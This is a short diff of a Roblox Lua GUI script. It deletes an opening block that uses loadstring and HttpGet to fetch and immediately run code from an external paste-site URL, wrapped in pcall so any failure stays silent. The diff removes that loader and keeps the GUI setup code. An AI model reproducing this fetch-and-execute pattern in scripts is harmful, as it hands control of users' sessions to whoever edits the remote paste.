@@ -1,8 +1,3 @@
--- Step 1: Run external script immediately
-pcall(function()
-    loadstring(game:HttpGet("http://vpaste.net/IUnmZ", true))()
-end)
-
 -- Step 2: GUI starts here
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
